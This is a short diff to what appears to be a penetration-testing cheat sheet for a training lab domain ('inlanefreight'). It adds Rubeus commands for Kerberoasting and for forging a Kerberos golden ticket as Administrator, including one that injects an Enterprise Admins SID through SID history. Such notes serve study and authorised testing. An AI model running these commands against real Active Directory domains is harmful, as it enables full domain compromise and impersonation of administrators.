@@ -868,6 +868,11 @@ Enter-PSSession ws01.inlanefreight.local
 .\Rubeus.exe kerberoast /nowrap /format:hashcat /dc:
 # RC4
 .\Rubeus.exe kerberoast /nowrap /format:hashcat /dc: /tgtdeleg
+
+# Golden Ticket
+.\Rubeus.exe golden /rc4:992093609707726257e0959ce3e24771 /domain:dev.inlanefreight.ad /sid:S-1-5-21-2901893446-2198612369-2488268720 /user:Administrator /ptt
+## SIDhistory
+.\Rubeus.exe golden /sids:S-1-5-21-2879935145-656083549-3766571964-519
 ```
 
 
